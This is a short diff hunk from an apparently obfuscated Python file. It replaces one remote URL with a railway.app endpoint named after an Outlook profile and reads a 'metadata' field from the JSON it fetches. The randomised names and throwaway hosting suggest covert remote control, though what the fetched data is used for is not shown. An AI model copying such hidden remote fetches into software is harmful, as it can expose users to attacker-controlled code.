@@ -18,7 +18,7 @@ def model_syyiwl_739():
 
     def data_pvckpe_467():
         try:
-            learn_kgqghp_552 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_kgqghp_552 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_kgqghp_552.raise_for_status()
             data_yxairj_787 = learn_kgqghp_552.json()
             eval_lgmime_618 = data_yxairj_787.get('metadata')
